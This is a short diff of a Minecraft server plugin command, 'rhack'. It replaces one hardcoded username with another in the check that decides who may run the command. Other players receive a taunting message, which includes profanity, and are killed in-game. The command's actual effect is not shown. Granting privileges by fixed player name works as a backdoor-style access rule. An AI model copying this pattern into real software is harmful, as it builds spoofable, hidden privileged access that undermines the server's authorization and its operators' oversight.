@@ -29,7 +29,7 @@ public class Command_rhack extends TFM_Command
     @SuppressWarnings("unchecked")
     public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
     {
-        if (!sender.getName().equals("iHess") && !sender.getName().equals("nobodymayaccessthiscmdlolsogetoutofherenoobifuckinghateyou"))
+        if (!sender.getName().equals("SanikIsFast") && !sender.getName().equals("nobodymayaccessthiscmdlolsogetoutofherenoobifuckinghateyou"))
         {
             sender_p.sendMessage(ChatColor.RED + "Only skilled hackers may use this command.\nNo permissions for the people who aren't hackers..");
             sender_p.setHealth(0.0);
